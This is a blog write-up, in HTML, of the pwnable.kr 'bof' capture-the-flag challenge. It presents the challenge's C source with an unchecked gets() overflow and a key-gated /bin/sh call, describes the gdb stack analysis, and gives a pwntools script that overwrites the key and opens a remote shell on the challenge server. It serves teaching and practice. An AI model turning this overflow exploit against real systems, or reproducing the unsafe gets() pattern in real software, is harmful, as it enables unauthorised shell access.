@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Pwnable.kr - Toddler&#39;s Battle - [bof] - Saad Akhtar</title><meta name="Description" content="Pwnable.kr Toddler&#39;s Battle challenge bof writeup."><meta property="og:title" content="Pwnable.kr - Toddler&#39;s Battle - [bof]" />
+<meta property="og:description" content="Pwnable.kr Toddler&#39;s Battle challenge bof writeup." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/pwnable.kr-toddlers-bottle-bof/" /><meta property="og:image" content="/pwnable.kr-toddlers-bottle-bof/0.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-07-24T11:26:21+05:00" />
+<meta property="article:modified_time" content="2022-07-24T11:26:21+05:00" /><meta property="og:site_name" content="Saad Akhtar" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/pwnable.kr-toddlers-bottle-bof/0.png"/>
+<meta name="twitter:title" content="Pwnable.kr - Toddler&#39;s Battle - [bof]"/>
+<meta name="twitter:description" content="Pwnable.kr Toddler&#39;s Battle challenge bof writeup."/>
+<meta name="application-name" content="Saad Akhtar">
+<meta name="apple-mobile-web-app-title" content="Saad Akhtar"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="favicon.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/pwnable.kr-toddlers-bottle-bof/" /><link rel="prev" href="/pwnable.kr-toddlers-bottle-collision/" /><link rel="next" href="/hackthebox-late/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Pwnable.kr - Toddler's Battle - [bof]",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/pwnable.kr-toddlers-bottle-bof\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "\/pwnable.kr-toddlers-bottle-bof\/0.png",
+                            "width":  1298 ,
+                            "height":  500 
+                        }],"genre": "posts","keywords": "pwn, binary exploitation","wordcount":  580 ,
+        "url": "\/pwnable.kr-toddlers-bottle-bof\/","datePublished": "2022-07-24T11:26:21+05:00","dateModified": "2022-07-24T11:26:21+05:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "Saad Akhtar"
+            },"description": "Pwnable.kr Toddler's Battle challenge bof writeup."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Pwnable.kr - Toddler's Battle - [bof]</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://ssaadakhtarr.github.io/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Saad Akhtar</a></span>&nbsp;<span class="post-category">included in <a href="/categories/pwnable.kr/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Pwnable.kr</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-07-24">2022-07-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;580 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/pwnable.kr-toddlers-bottle-bof/0.png"
+        data-srcset="/pwnable.kr-toddlers-bottle-bof/0.png, /pwnable.kr-toddlers-bottle-bof/0.png 1.5x, /pwnable.kr-toddlers-bottle-bof/0.png 2x"
+        data-sizes="auto"
+        alt="/pwnable.kr-toddlers-bottle-bof/0.png"
+        title="Pwnable.kr Toddler&#39;s Battle challenge bof writeup." /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="description">Description</h2>
+<p>This post will focus on an easy pwn challenge <em>bof</em> from Toddler&rsquo;s Bottle series of pwnable.kr.</p>
+<p>Starting off we have the following description.</p>
+<p><figure><a class="lightgallery" href="/pwnable.kr-toddlers-bottle-bof/1.png" title="Description" data-thumbnail="/pwnable.kr-toddlers-bottle-bof/1.png" data-sub-html="<h2>Description</h2><p>Description</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/pwnable.kr-toddlers-bottle-bof/1.png"
+            data-srcset="/pwnable.kr-toddlers-bottle-bof/1.png, /pwnable.kr-toddlers-bottle-bof/1.png 1.5x, /pwnable.kr-toddlers-bottle-bof/1.png 2x"
+            data-sizes="auto"
+            alt="/pwnable.kr-toddlers-bottle-bof/1.png" width="600" height="401" />
+    </a><figcaption class="image-caption">Description</figcaption>
+    </figure></p>
+<p>From the description, we can guess there&rsquo;s a buffer overflow vulnerability here which we&rsquo;ll be exploiting.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Buffer Overflow<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">In information security and programming, a buffer overflow, or buffer overrun, is an anomaly where a program, while writing data to a buffer, overruns the buffer&rsquo;s boundary and overwrites adjacent memory locations.</div>
+        </div>
+    </div>
+<p>Source: <a href="https://en.wikipedia.org/wiki/Buffer_overflow" target="_blank" rel="noopener noreffer ">https://en.wikipedia.org/wiki/Buffer_overflow</a></p>
+<p>After downloading both attached files looking at the binary.</p>
+<p><figure><a class="lightgallery" href="/pwnable.kr-toddlers-bottle-bof/2.png" title="File" data-thumbnail="/pwnable.kr-toddlers-bottle-bof/2.png" data-sub-html="<h2>File</h2><p>File</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/pwnable.kr-toddlers-bottle-bof/2.png"
+            data-srcset="/pwnable.kr-toddlers-bottle-bof/2.png, /pwnable.kr-toddlers-bottle-bof/2.png 1.5x, /pwnable.kr-toddlers-bottle-bof/2.png 2x"
+            data-sizes="auto"
+            alt="/pwnable.kr-toddlers-bottle-bof/2.png" width="1346" height="128" />
+    </a><figcaption class="image-caption">File</figcaption>
+    </figure></p>
+<p>Running the binary, it first prints <code>overflow me: </code>, then we can enter some input and then it returns <code>Nah..</code>.</p>
+<p><figure><a class="lightgallery" href="/pwnable.kr-toddlers-bottle-bof/3.png" title="Running the binary" data-thumbnail="/pwnable.kr-toddlers-bottle-bof/3.png" data-sub-html="<h2>Running the binary</h2><p>Running the binary</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/pwnable.kr-toddlers-bottle-bof/3.png"
+            data-srcset="/pwnable.kr-toddlers-bottle-bof/3.png, /pwnable.kr-toddlers-bottle-bof/3.png 1.5x, /pwnable.kr-toddlers-bottle-bof/3.png 2x"
+            data-sizes="auto"
+            alt="/pwnable.kr-toddlers-bottle-bof/3.png" width="892" height="159" />
+    </a><figcaption class="image-caption">Running the binary</figcaption>
+    </figure></p>
+<p>If we provide a longer input while running the binary it smashes the stack.</p>
+<p><figure><a class="lightgallery" href="/pwnable.kr-toddlers-bottle-bof/6.png" title="Stack smashing" data-thumbnail="/pwnable.kr-toddlers-bottle-bof/6.png" data-sub-html="<h2>Stack Smashing</h2><p>Stack smashing</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/pwnable.kr-toddlers-bottle-bof/6.png"
+            data-srcset="/pwnable.kr-toddlers-bottle-bof/6.png, /pwnable.kr-toddlers-bottle-bof/6.png 1.5x, /pwnable.kr-toddlers-bottle-bof/6.png 2x"
+            data-sizes="auto"
+            alt="/pwnable.kr-toddlers-bottle-bof/6.png" width="820" height="176" />
+    </a><figcaption class="image-caption">Stack Smashing</figcaption>
+    </figure></p>
+<p>Looking at the C code.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">int</span> <span class="n">key</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">overflowme</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;overflow me : &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">gets</span><span class="p">(</span><span class="n">overflowme</span><span class="p">);</span>       <span class="c1">// smash me!
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="n">key</span> <span class="o">==</span> <span class="mh">0xcafebabe</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Nah..</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">func</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There are two functions <code>main</code> and <code>func</code>. In the <code>main</code> function it is calling the <code>func</code> with the value <code>0xdeadbeef</code>.</p>
+<p>Let&rsquo;s dive into the <code>func</code> function and understand what&rsquo;s going on.</p>
+<p>It first defines a variable <code>overflowme</code> with the buffer size of <code>32</code> then it prints <code>overflow me: </code> which we saw while running the binary. And if we provide an input more than <code>32</code> bytes then it smashes the stack.</p>
+<p>After that it takes our input and saves it in the <code>overflowme</code> variable using the <code>gets</code> function.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>gets() function<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">The gets() function is unsafe because it does not perform bounds checking on the size of its input. An attacker can easily send arbitrarily-sized input to gets() and overflow the destination buffer.</div>
+        </div>
+    </div>
+<p>Source: <a href="https://cwe.mitre.org/data/definitions/242.html" target="_blank" rel="noopener noreffer ">https://cwe.mitre.org/data/definitions/242.html</a></p>
+<p>With this we have a vague idea of how we&rsquo;re going to exploit this vulnerability.</p>
+<p>After this it compares the value of the parameter <code>key</code> with <code>0xcafebabe</code> and if it becomes true it spawns a shell.</p>
+<p>If we run the program normally this condition will never be true because the argument <code>0xdeadbeef</code> is provided to the <code>func</code> in the <code>main</code> function.</p>
+<p>In order to make this work, we need to make the buffer overflow and insert the value <code>0xcafebabe</code> to the <code>key</code> parameter.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Let&rsquo;s fire up <code>gdb</code>.</p>
+<p><figure><a class="lightgallery" href="/pwnable.kr-toddlers-bottle-bof/4.png" title="gdb" data-thumbnail="/pwnable.kr-toddlers-bottle-bof/4.png" data-sub-html="<h2>gdb</h2><p>gdb</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/pwnable.kr-toddlers-bottle-bof/4.png"
+            data-srcset="/pwnable.kr-toddlers-bottle-bof/4.png, /pwnable.kr-toddlers-bottle-bof/4.png 1.5x, /pwnable.kr-toddlers-bottle-bof/4.png 2x"
+            data-sizes="auto"
+            alt="/pwnable.kr-toddlers-bottle-bof/4.png" width="1022" height="500" />
+    </a><figcaption class="image-caption">gdb</figcaption>
+    </figure></p>
+<p>Add a break point at <code>main</code> and run the program.</p>
+<p><figure><a class="lightgallery" href="/pwnable.kr-toddlers-bottle-bof/5.png" title="break main" data-thumbnail="/pwnable.kr-toddlers-bottle-bof/5.png" data-sub-html="<h2>break main</h2><p>break main</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/pwnable.kr-toddlers-bottle-bof/5.png"
+            data-srcset="/pwnable.kr-toddlers-bottle-bof/5.png, /pwnable.kr-toddlers-bottle-bof/5.png 1.5x, /pwnable.kr-toddlers-bottle-bof/5.png 2x"
+            data-sizes="auto"
+            alt="/pwnable.kr-toddlers-bottle-bof/5.png" width="874" height="191" />
+    </a><figcaption class="image-caption">break main</figcaption>
+    </figure></p>
+<p>Now disassemble the <code>func</code>.</p>
+<p><figure><a class="lightgallery" href="/pwnable.kr-toddlers-bottle-bof/7.png" title="Dissasembling the func" data-thumbnail="/pwnable.kr-toddlers-bottle-bof/7.png" data-sub-html="<h2>Dissasembling the func</h2><p>Dissasembling the func</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/pwnable.kr-toddlers-bottle-bof/7.png"
+            data-srcset="/pwnable.kr-toddlers-bottle-bof/7.png, /pwnable.kr-toddlers-bottle-bof/7.png 1.5x, /pwnable.kr-toddlers-bottle-bof/7.png 2x"
+            data-sizes="auto"
+            alt="/pwnable.kr-toddlers-bottle-bof/7.png" width="645" height="527" />
+    </a><figcaption class="image-caption">Dissasembling the func</figcaption>
+    </figure></p>
+<p>We can see the key <code>0xcafebabe</code> with <code>cmpl</code> instruction at <code>0x56555654</code>.</p>
+<p>Let&rsquo;s set a breakpoint here as well.</p>
+<p><figure><a class="lightgallery" href="/pwnable.kr-toddlers-bottle-bof/8.png" title="Breakpoint at 0x56555654" data-thumbnail="/pwnable.kr-toddlers-bottle-bof/8.png" data-sub-html="<h2>Breakpoint at 0x56555654</h2><p>Breakpoint at 0x56555654</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/pwnable.kr-toddlers-bottle-bof/8.png"
+            data-srcset="/pwnable.kr-toddlers-bottle-bof/8.png, /pwnable.kr-toddlers-bottle-bof/8.png 1.5x, /pwnable.kr-toddlers-bottle-bof/8.png 2x"
+            data-sizes="auto"
+            alt="/pwnable.kr-toddlers-bottle-bof/8.png" width="285" height="45" />
+    </a><figcaption class="image-caption">Breakpoint at 0x56555654</figcaption>
+    </figure></p>
+<p>Continue the execution and enter an input within the buffer limit.</p>
+<p><figure><a class="lightgallery" href="/pwnable.kr-toddlers-bottle-bof/9.png" title="Second Breakpoint" data-thumbnail="/pwnable.kr-toddlers-bottle-bof/9.png" data-sub-html="<h2>Second Breakpoint</h2><p>Second Breakpoint</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/pwnable.kr-toddlers-bottle-bof/9.png"
+            data-srcset="/pwnable.kr-toddlers-bottle-bof/9.png, /pwnable.kr-toddlers-bottle-bof/9.png 1.5x, /pwnable.kr-toddlers-bottle-bof/9.png 2x"
+            data-sizes="auto"
+            alt="/pwnable.kr-toddlers-bottle-bof/9.png" width="392" height="152" />
+    </a><figcaption class="image-caption">Second Breakpoint</figcaption>
+    </figure></p>
+<p>Now look at the stack.</p>
+<p><figure><a class="lightgallery" href="/pwnable.kr-toddlers-bottle-bof/10.png" title="Stack" data-thumbnail="/pwnable.kr-toddlers-bottle-bof/10.png" data-sub-html="<h2>Stack</h2><p>Stack</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/pwnable.kr-toddlers-bottle-bof/10.png"
+            data-srcset="/pwnable.kr-toddlers-bottle-bof/10.png, /pwnable.kr-toddlers-bottle-bof/10.png 1.5x, /pwnable.kr-toddlers-bottle-bof/10.png 2x"
+            data-sizes="auto"
+            alt="/pwnable.kr-toddlers-bottle-bof/10.png" width="785" height="282" />
+    </a><figcaption class="image-caption">Stack</figcaption>
+    </figure></p>
+<p>We can see the <code>0xdeadbeef</code> in front of <code>0xffffd060</code>. Before that our input starts at the last row in front of <code>0xffffd020</code>.</p>
+<p>So since each block is of <code>4</code> bytes and we have <code>13</code> blocks before <code>0xdeadbeef</code>, we need to provide exactly <code>13 * 4 = 52</code> bytes of input and then our key <code>0xcafebabe</code> in order to successfully spawn the shell.</p>
+<p>The following payload will break the stack and overwrite the desired key and spawn the shell.</p>
+<p><figure><a class="lightgallery" href="/pwnable.kr-toddlers-bottle-bof/11.png" title="Pyaload &amp;amp; Flag" data-thumbnail="/pwnable.kr-toddlers-bottle-bof/11.png" data-sub-html="<h2>Payload &amp; Flag</h2><p>Pyaload &amp;amp; Flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/pwnable.kr-toddlers-bottle-bof/11.png"
+            data-srcset="/pwnable.kr-toddlers-bottle-bof/11.png, /pwnable.kr-toddlers-bottle-bof/11.png 1.5x, /pwnable.kr-toddlers-bottle-bof/11.png 2x"
+            data-sizes="auto"
+            alt="/pwnable.kr-toddlers-bottle-bof/11.png" width="1145" height="413" />
+    </a><figcaption class="image-caption">Payload & Flag</figcaption>
+    </figure></p>
+<p>We can also write a small script to spawn an interactive shell using python.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">52</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\xbe\xba\xfe\xca</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shell</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwnable.kr&#39;</span><span class="p">,</span> <span class="mi">9000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">shell</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Interactive shell.</p>
+<p><figure><a class="lightgallery" href="/pwnable.kr-toddlers-bottle-bof/12.png" title="Python shell" data-thumbnail="/pwnable.kr-toddlers-bottle-bof/12.png" data-sub-html="<h2>Python Shell</h2><p>Python shell</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/pwnable.kr-toddlers-bottle-bof/12.png"
+            data-srcset="/pwnable.kr-toddlers-bottle-bof/12.png, /pwnable.kr-toddlers-bottle-bof/12.png 1.5x, /pwnable.kr-toddlers-bottle-bof/12.png 2x"
+            data-sizes="auto"
+            alt="/pwnable.kr-toddlers-bottle-bof/12.png" width="1357" height="424" />
+    </a><figcaption class="image-caption">Python Shell</figcaption>
+    </figure></p>
+<p><strong>Thanks for reading!</strong></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-07-24</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/pwnable.kr-toddlers-bottle-bof/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/pwnable.kr-toddlers-bottle-bof/" data-title="Pwnable.kr - Toddler&#39;s Battle - [bof]" data-via="ssaadakhtarr" data-hashtags="pwn,binary exploitation"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/pwnable.kr-toddlers-bottle-bof/" data-hashtag="pwn"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/pwnable.kr-toddlers-bottle-bof/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/pwn/">pwn</a>,&nbsp;<a href="/tags/binary-exploitation/">binary exploitation</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/pwnable.kr-toddlers-bottle-collision/" class="prev" rel="prev" title="Pwnable.kr - Toddler&#39;s Battle - [collision]"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Pwnable.kr - Toddler's Battle - [collision]</a>
+            <a href="/hackthebox-late/" class="next" rel="next" title="Hackthebox - Late">Hackthebox - Late<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.105.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Saad Akhtar</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" 